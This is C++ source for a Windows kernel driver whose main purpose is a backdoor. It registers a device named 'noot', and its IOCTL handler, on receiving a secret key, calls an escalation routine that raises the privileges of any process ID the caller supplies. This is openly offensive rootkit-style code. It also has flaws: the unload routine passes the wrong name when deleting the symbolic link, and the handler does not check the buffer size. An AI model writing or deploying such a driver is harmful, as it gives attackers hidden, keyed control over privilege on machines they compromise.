//#include<wdm.h>
#include "Header.h"
#include "Elevator.h"
#include "Util.h"
#include "Main.h"

VOID IocUnload(PDRIVER_OBJECT driverObject) {
    PDEVICE_OBJECT devObj = driverObject->DeviceObject;
    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\noot");

    IoDeleteSymbolicLink(&devName);
    if (devObj) IoDeleteDevice(devObj);
}

NTSTATUS IocCreateClose(PDEVICE_OBJECT devObj, PIRP irp) {

    UNREFERENCED_PARAMETER(devObj);

    PAGED_CODE(); //verify IRQL level

    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;

    IoCompleteRequest(irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;

}

extern "C" NTSTATUS
DriverEntry(
    IN PDRIVER_OBJECT  DriverObject,
    IN PUNICODE_STRING  RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\noot");
    UNICODE_STRING dosName = RTL_CONSTANT_STRING(L"\\DosDevices\\noot");
    PDEVICE_OBJECT devObj;

    NTSTATUS res = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &devObj);

    if (!NT_SUCCESS(res)) { Util::handleError(res, "IoCreateDevice, Status code: "); return res; }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = IocCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = IocCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoctlHandler;
    DriverObject->DriverUnload = IocUnload;

    res = IoCreateSymbolicLink(&dosName, &devName);

    if (!NT_SUCCESS(res)) { Util::handleError(res, "IoCreateSymbolicLink, Status code: "); return res; }

    return STATUS_SUCCESS;

}

NTSTATUS IoctlHandler(PDEVICE_OBJECT devObj, PIRP irp) {
    
    PIO_STACK_LOCATION irpSp;
    NTSTATUS ntStatus = STATUS_SUCCESS;
    ULONG inBufLen;

    UNREFERENCED_PARAMETER(devObj);
    irpSp = IoGetCurrentIrpStackLocation(irp);
    inBufLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
    PELEVATOR buf = (PELEVATOR)irp->AssociatedIrp.SystemBuffer;

    if (!inBufLen) {
        ntStatus = STATUS_INVALID_PARAMETER;
        goto End;
    }

    switch (irpSp->Parameters.DeviceIoControl.IoControlCode) {
    case IOCTL_PRIVESC:
        if (buf->key == KEY) {
            NTSTATUS res = Elevator::Escalate(buf->pid);
            if (!NT_SUCCESS(res)) { Util::handleError(res, "Escalate, Status code: "); return res; }
        }
        goto End;


    default:
        goto End;
    }

End:

    irp->IoStatus.Status = ntStatus;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return ntStatus;

}